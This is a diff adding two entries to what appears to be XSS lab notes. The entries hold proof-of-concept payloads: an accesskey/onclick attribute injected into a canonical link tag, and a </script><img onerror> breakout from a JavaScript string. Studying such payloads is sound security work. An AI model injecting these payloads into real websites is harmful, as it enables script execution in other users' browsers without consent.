@@ -65,5 +65,21 @@
 xss_stored_href_attribute.py
 ```
 
+## Reflected XSS in canonical link tag
 
+* Payload
+```html
+/'accesskey='X'onclick='alert(1)
+
+# press ALT + CTL + X to initiate the canonical link tag
+```
+
+## Reflected XSS into a JavaScript string with single quote and backslash escaped
+
+* Payload
+```html
+# Terminating the existing JS with </script> and introducing an XSS payload
+
+</script><img src=1 onerror=alert(1)>
+```
 
